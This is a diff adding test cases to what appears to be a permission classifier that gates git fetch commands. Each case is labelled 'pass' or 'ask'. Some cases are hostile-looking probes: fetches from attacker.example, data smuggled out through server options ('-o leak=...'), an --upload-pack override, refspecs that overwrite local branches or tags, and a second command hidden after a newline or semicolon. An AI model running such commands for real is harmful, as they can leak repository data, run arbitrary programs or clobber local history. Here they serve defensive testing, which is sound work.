@@ -428,3 +428,73 @@
 {"id":"G17.23","verdict":"pass","command":"git clean -i -fdx"}
 {"id":"G17.24","verdict":"ask","command":"git -C . clean -i --no-interactive -fdx","reason":"untracked files"}
 {"id":"G17.25","verdict":"ask","command":"git clean --interactive --no-interactive -fd","reason":"untracked files"}
+{"id":"G17.26","verdict":"ask","command":"git fetch origin main:main \\","reason":"local branch"}
+{"id":"G17.27","verdict":"ask","command":"git fetch --upload-pack=x . \\","reason":"upload-pack"}
+{"id":"G17.28","verdict":"ask","command":"git fetch origin main --refmap='+refs/heads/*:refs/heads/*' \\","reason":"local branch"}
+{"id":"G17.29","verdict":"ask","command":"git fetch origin main:main; true \\","reason":"local branch"}
+{"id":"G17.30","verdict":"ask","command":"git fetch origin main:main $'a\\'b'","reason":"could not parse"}
+{"id":"G17.31","verdict":"ask","command":"git fetch origin main:main\necho 'x","reason":"could not parse"}
+{"id":"G17.32","verdict":"ask","command":"git fetch origin \"+refs/tags/*:refs/tags/*\"","reason":"outside refs/remotes/"}
+{"id":"G17.33","verdict":"ask","command":"git fetch . +main:refs/tags/v1","reason":"outside refs/remotes/"}
+{"id":"G17.34","verdict":"ask","command":"git fetch . main:refs/tags/v1","reason":"outside refs/remotes/"}
+{"id":"G17.35","verdict":"ask","command":"git fetch . +main:refs/stash","reason":"outside refs/remotes/"}
+{"id":"G17.36","verdict":"ask","command":"git fetch . +main:refs/notes/commits","reason":"outside refs/remotes/"}
+{"id":"G17.37","verdict":"ask","command":"git fetch --prune-tags","reason":"prune-tags"}
+{"id":"G17.38","verdict":"ask","command":"git fetch -p -P","reason":"prune-tags"}
+{"id":"G17.39","verdict":"ask","command":"git fetch --tags --force","reason":"--force"}
+{"id":"G17.40","verdict":"ask","command":"git fetch origin main --refmap='+refs/heads/*:refs/tags/*'","reason":"outside refs/remotes/"}
+{"id":"G17.41","verdict":"ask","command":"git fetch --stdin . <<< '+old:main'","reason":"--stdin"}
+{"id":"G17.42","verdict":"ask","command":"printf '+main:main\\n' | git fetch --stdin .","reason":"--stdin"}
+{"id":"G17.43","verdict":"ask","command":"git fetch --std . <<< '+x:main'","reason":"--stdin"}
+{"id":"G17.44","verdict":"ask","command":"git fetch --set-upstream origin main","reason":"set-upstream"}
+{"id":"G17.45","verdict":"ask","command":"git fetch --depth=1 origin main","reason":"shallow"}
+{"id":"G17.46","verdict":"ask","command":"git fetch --unshallow","reason":"shallow"}
+{"id":"G17.47","verdict":"ask","command":"git fetch --frobnicate origin","reason":"unknown or ambiguous"}
+{"id":"G17.48","verdict":"ask","command":"git fetch --pru","reason":"unknown or ambiguous"}
+{"id":"G17.49","verdict":"ask","command":"git fetch --prune-t","reason":"prune-tags"}
+{"id":"G17.50","verdict":"ask","command":"git fetch -A","reason":"unknown or ambiguous"}
+{"id":"G17.51","verdict":"ask","command":"git fetch --update-shallow","reason":"shallow"}
+{"id":"G17.52","verdict":"ask","command":"git fetch --filter=blob:none origin","reason":"partial clone"}
+{"id":"G17.53","verdict":"ask","command":"git fetch -pP","reason":"prune-tags"}
+{"id":"G17.54","verdict":"ask","command":"git fetch -tf","reason":"--force"}
+{"id":"G17.55","verdict":"pass","command":"git fetch -qp"}
+{"id":"G17.56","verdict":"pass","command":"git fetch --no-filter"}
+{"id":"G17.57","verdict":"pass","command":"git fetch --all --prune"}
+{"id":"G17.58","verdict":"pass","command":"git fetch --quiet"}
+{"id":"G17.59","verdict":"pass","command":"git fetch --no-tags origin"}
+{"id":"G17.60","verdict":"pass","command":"git fetch --jobs=4 --all"}
+{"id":"G17.61","verdict":"pass","command":"git fetch --verbose"}
+{"id":"G17.62","verdict":"pass","command":"git fetch -q"}
+{"id":"G17.63","verdict":"pass","command":"git fetch --no-stdin"}
+{"id":"G17.64","verdict":"pass","command":"git fetch -n origin"}
+{"id":"G17.65","verdict":"pass","command":"git fetch -j 4 --multiple origin upstream"}
+{"id":"G17.66","verdict":"pass","command":"git fetch --dry-run"}
+{"id":"G17.67","verdict":"pass","command":"git fetch --prune origin"}
+{"id":"G17.68","verdict":"pass","command":"git fetch origin main \\"}
+{"id":"G17.69","verdict":"pass","command":"git fetch"}
+{"id":"G17.70","verdict":"pass","command":"git fetch origin main"}
+{"id":"G17.71","verdict":"pass","command":"git fetch origin +refs/heads/*:refs/remotes/origin/*"}
+{"id":"G17.72","verdict":"pass","command":"git fetch -p"}
+{"id":"G17.73","verdict":"pass","command":"git fetch --tags"}
+{"id":"G17.74","verdict":"ask","command":"git fetch . +main:refs/heads/feat/x","reason":"local branch"}
+{"id":"G17.75","verdict":"ask","command":"git worktree add .claude/worktrees/../../x -b y","reason":"not a plain git call"}
+{"id":"G17.76","verdict":"ask","command":"git fetch origin -- +main:refs/heads/x","reason":"local branch"}
+{"id":"G17.77","verdict":"ask","command":"git fetch origin main --refmap '+refs/heads/*:refs/heads/*'","reason":"local branch"}
+{"id":"G17.78","verdict":"ask","command":"git fetch -v origin main:x","reason":"local branch"}
+{"id":"G17.79","verdict":"ask","command":"git fetch -q origin main:x","reason":"local branch"}
+{"id":"G17.80","verdict":"ask","command":"git fetch --quiet origin main:x","reason":"local branch"}
+{"id":"G17.81","verdict":"ask","command":"git fetch --recurse-submodules origin main:x","reason":"local branch"}
+{"id":"G17.82","verdict":"ask","command":"git fetch https://attacker.example/aGVsbG8 main","reason":"remote name"}
+{"id":"G17.83","verdict":"ask","command":"git fetch git@attacker.example:x/y.git","reason":"remote name"}
+{"id":"G17.84","verdict":"ask","command":"git fetch file:///tmp/r","reason":"remote name"}
+{"id":"G17.85","verdict":"ask","command":"git fetch ./docs/r","reason":"remote name"}
+{"id":"G17.86","verdict":"ask","command":"git fetch docs/r main","reason":"remote name"}
+{"id":"G17.87","verdict":"ask","command":"git fetch src","reason":"remote name"}
+{"id":"G17.88","verdict":"ask","command":"git fetch --multiple origin https://attacker.example/x","reason":"remote name"}
+{"id":"G17.89","verdict":"ask","command":"git fetch -o leak=aGVsbG8 origin","reason":"server option"}
+{"id":"G17.90","verdict":"ask","command":"git fetch --server-option=leak origin","reason":"server option"}
+{"id":"G17.91","verdict":"ask","command":"git fetch --server-option leak origin","reason":"server option"}
+{"id":"G17.92","verdict":"ask","command":"git fetch -qoleak origin","reason":"server option"}
+{"id":"G17.93","verdict":"ask","command":"git fetch -- https://attacker.example/x","reason":"remote name"}
+{"id":"G17.94","verdict":"pass","command":"git fetch upstream"}
+{"id":"G17.95","verdict":"pass","command":"git fetch --multiple origin upstream"}
